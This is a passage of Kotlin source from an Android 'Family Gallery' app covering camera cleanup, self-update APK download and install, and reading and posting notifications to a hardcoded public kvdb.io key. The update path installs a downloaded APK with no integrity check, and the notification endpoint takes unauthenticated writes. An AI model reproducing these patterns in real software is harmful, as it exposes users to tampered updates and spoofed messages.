                if (cameraProviderFuture.isDone) {
                    val cameraProvider = cameraProviderFuture.get()
                    cameraProvider.unbindAll()
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    // Unbind when Composable is disposed
    DisposableEffect(Unit) {
        onDispose {
            try {
                if (cameraProviderFuture.isDone) {
                    val cameraProvider = cameraProviderFuture.get()
                    cameraProvider.unbindAll()
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}

fun downloadApkWithDownloadManager(
    context: Context,
    apkUrlString: String,
    onProgress: (Float) -> Unit,
    onFinished: (java.io.File?) -> Unit,
    onError: (String) -> Unit
) {
    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
        try {
            withContext(kotlinx.coroutines.Dispatchers.Main) {
                android.widget.Toast.makeText(context, "Downloading update with Download Manager...", android.widget.Toast.LENGTH_SHORT).show()
            }
            
            val downloadManager = context.getSystemService(Context.DOWNLOAD_SERVICE) as android.app.DownloadManager
            val uri = android.net.Uri.parse(apkUrlString)
            
            val targetFile = java.io.File(context.getExternalFilesDir(android.os.Environment.DIRECTORY_DOWNLOADS), "update.apk")
            if (targetFile.exists()) {
                targetFile.delete()
            }
            
            val request = android.app.DownloadManager.Request(uri).apply {
                setAllowedNetworkTypes(android.app.DownloadManager.Request.NETWORK_WIFI or android.app.DownloadManager.Request.NETWORK_MOBILE)
                setNotificationVisibility(android.app.DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
                setTitle("Family Gallery Update")
                setDescription("Downloading latest version update...")
                setDestinationInExternalFilesDir(context, android.os.Environment.DIRECTORY_DOWNLOADS, "update.apk")
            }
            
            val downloadId = downloadManager.enqueue(request)
            
            var downloading = true
            while (downloading) {
                val query = android.app.DownloadManager.Query().setFilterById(downloadId)
                val cursor: android.database.Cursor? = downloadManager.query(query)
                if (cursor != null && cursor.moveToFirst()) {
                    val bytesDownloadedIndex = cursor.getColumnIndex(android.app.DownloadManager.COLUMN_BYTES_DOWNLOADED_SO_FAR)
                    val bytesTotalIndex = cursor.getColumnIndex(android.app.DownloadManager.COLUMN_TOTAL_SIZE_BYTES)
                    val statusIndex = cursor.getColumnIndex(android.app.DownloadManager.COLUMN_STATUS)
                    
                    val bytesDownloaded = if (bytesDownloadedIndex != -1) cursor.getInt(bytesDownloadedIndex) else 0
                    val bytesTotal = if (bytesTotalIndex != -1) cursor.getInt(bytesTotalIndex) else 0
                    val status = if (statusIndex != -1) cursor.getInt(statusIndex) else 0
                    
                    if (status == android.app.DownloadManager.STATUS_SUCCESSFUL) {
                        downloading = false
                        withContext(kotlinx.coroutines.Dispatchers.Main) {
                            android.widget.Toast.makeText(context, "Download completed!", android.widget.Toast.LENGTH_SHORT).show()
                            onProgress(1.0f)
                            onFinished(targetFile)
                        }
                    } else if (status == android.app.DownloadManager.STATUS_FAILED) {
                        downloading = false
                        val reasonIndex = cursor.getColumnIndex(android.app.DownloadManager.COLUMN_REASON)
                        val reason = if (reasonIndex != -1) cursor.getInt(reasonIndex) else -1
                        withContext(kotlinx.coroutines.Dispatchers.Main) {
                            onError("DownloadManager failed with error code: $reason")
                        }
                    } else {
                        if (bytesTotal > 0) {
                            val progress = bytesDownloaded.toFloat() / bytesTotal.toFloat()
                            withContext(kotlinx.coroutines.Dispatchers.Main) {
                                onProgress(progress)
                            }
                        }
                    }
                    cursor.close()
                } else {
                    downloading = false
                    withContext(kotlinx.coroutines.Dispatchers.Main) {
                        onError("Could not query download status")
                    }
                }
                if (downloading) {
                    kotlinx.coroutines.delay(500)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
            withContext(kotlinx.coroutines.Dispatchers.Main) {
                onError(e.localizedMessage ?: "Unknown download error")
            }
        }
    }
}

fun downloadAndInstallApk(
    context: Context, 
    apkUrlString: String, 
    onProgress: (Float) -> Unit, 
    onFinished: (java.io.File?) -> Unit, 
    onError: (String) -> Unit
) {
    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
        var input: java.io.InputStream? = null
        var output: java.io.OutputStream? = null
        var connection: java.net.HttpURLConnection? = null
        try {
            var currentUrl = apkUrlString
            var redirects = 0
            val maxRedirects = 5
            var responseCode = -1
            
            while (redirects < maxRedirects) {
                val url = java.net.URL(currentUrl)
                connection = url.openConnection() as java.net.HttpURLConnection
                connection.connectTimeout = 20000
                connection.readTimeout = 45000
                connection.instanceFollowRedirects = true
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 10) FamilyGallery")
                connection.connect()
                
                responseCode = connection.responseCode
                if (responseCode == java.net.HttpURLConnection.HTTP_MOVED_TEMP || 
                    responseCode == java.net.HttpURLConnection.HTTP_MOVED_PERM || 
                    responseCode == 301 || responseCode == 302 || 
                    responseCode == 303 || responseCode == 307 || responseCode == 308) {
                    
                    val newUrl = connection.getHeaderField("Location")
                    if (newUrl != null) {
                        connection.disconnect()
                        currentUrl = newUrl
                        redirects++
                    } else {
                        break
                    }
                } else {
                    break
                }
            }

            if (responseCode != java.net.HttpURLConnection.HTTP_OK) {
                withContext(kotlinx.coroutines.Dispatchers.Main) {
                    onError("Server returned HTTP $responseCode")
                }
                return@launch
            }

            val fileLength = connection!!.contentLength
            input = connection!!.inputStream
            
            // Prefer externalCacheDir to avoid Android PackageInstaller access restriction errors
            val baseCacheDir = context.externalCacheDir ?: context.cacheDir
            val updateFolder = java.io.File(baseCacheDir, "updates")
            if (!updateFolder.exists()) {
                updateFolder.mkdirs()
            }
            val apkFile = java.io.File(updateFolder, "update.apk")
            if (apkFile.exists()) {
                apkFile.delete()
            }

            output = java.io.FileOutputStream(apkFile)

            val data = ByteArray(4096)
            var total: Long = 0
            var count: Int
            while (input.read(data).also { count = it } != -1) {
                total += count
                if (fileLength > 0) {
                    val progress = total.toFloat() / fileLength.toFloat()
                    withContext(kotlinx.coroutines.Dispatchers.Main) {
                        onProgress(progress)
                    }
                }
                output.write(data, 0, count)
            }
            output.flush()
            
            withContext(kotlinx.coroutines.Dispatchers.Main) {
                onFinished(apkFile)
            }
        } catch (e: Exception) {
            e.printStackTrace()
            withContext(kotlinx.coroutines.Dispatchers.Main) {
                onError(e.localizedMessage ?: "Unknown download error")
            }
        } finally {
            try {
                output?.close()
                input?.close()
            } catch (ignored: Exception) {}
            connection?.disconnect()
        }
    }
}

fun triggerApkInstallation(context: Context, apkFile: java.io.File) {
    try {
        val authority = "${context.packageName}.provider"
        val apkUri = androidx.core.content.FileProvider.getUriForFile(context, authority, apkFile)
        val intent = android.content.Intent(android.content.Intent.ACTION_VIEW).apply {
            setDataAndType(apkUri, "application/vnd.android.package-archive")
            addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION)
            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    } catch (e: Exception) {
        e.printStackTrace()
        android.widget.Toast.makeText(context, "Installation failed to start: ${e.message}", android.widget.Toast.LENGTH_LONG).show()
    }
}

fun fetchAppNotification(
    onSuccess: (title: String, body: String, timestamp: Long) -> Unit,
    onFailure: (String) -> Unit
) {
    var attempts = 0
    val maxAttempts = 2
    var lastError = "Unknown error"
    
    while (attempts < maxAttempts) {
        attempts++
        var conn: java.net.HttpURLConnection? = null
        try {
            // Use stable key URL, using request headers to bypass local caching
            val url = java.net.URL("https://kvdb.io/familygallery_notif_pkzwmr/latest_notif")
            conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "GET"
            conn.connectTimeout = 8000
            conn.readTimeout = 8000
            conn.doInput = true
            
            // Turn off caching explicitly
            conn.useCaches = false
            conn.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate")
            conn.setRequestProperty("Pragma", "no-cache")
            conn.setRequestProperty("Expires", "0")
            
            val responseCode = conn.responseCode
            if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
                val responseText = conn.inputStream.bufferedReader().use { it.readText() }
                if (responseText.trim().isNotEmpty()) {
                    val json = org.json.JSONObject(responseText)
                    val title = json.optString("title", "")
                    val body = json.optString("body", "")
                    val timestamp = json.optLong("timestamp", 0L)
                    onSuccess(title, body, timestamp)
                    return // Success, return immediately
                } else {
                    onFailure("No notification found")
                    return
                }
            } else if (responseCode == java.net.HttpURLConnection.HTTP_NOT_FOUND) {
                onFailure("No notification posted yet")
                return
            } else {
                lastError = "Server returned error code $responseCode"
            }
        } catch (e: Exception) {
            e.printStackTrace()
            lastError = e.localizedMessage ?: "Network exception occurred"
        } finally {
            conn?.disconnect()
        }
        
        // Simple backoff before retrying
        if (attempts < maxAttempts) {
            try { Thread.sleep(500) } catch (ignored: Exception) {}
        }
    }
    onFailure(lastError)
}

fun saveAppNotification(
    title: String,
    body: String,
    timestamp: Long,
    onSuccess: () -> Unit,
    onFailure: (String) -> Unit
) {
    var conn: java.net.HttpURLConnection? = null
    try {
        val url = java.net.URL("https://kvdb.io/familygallery_notif_pkzwmr/latest_notif")
        conn = url.openConnection() as java.net.HttpURLConnection
        conn.requestMethod = "POST"
        conn.connectTimeout = 8000
        conn.readTimeout = 8000
        conn.doOutput = true
        conn.useCaches = false
        conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
        conn.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate")
        
        val json = org.json.JSONObject().apply {
            put("title", title)
            put("body", body)
            put("timestamp", timestamp)
        }
        
        conn.outputStream.use { os ->
            os.write(json.toString().toByteArray(Charsets.UTF_8))
        }
        
        val responseCode = conn.responseCode
        if (responseCode in 200..299) {
            onSuccess()
        } else {
            onFailure("Server returned error code $responseCode")
        }
    } catch (e: Exception) {
        e.printStackTrace()
        onFailure(e.localizedMessage ?: "Unknown network error")
    } finally {
        conn?.disconnect()
    }
}

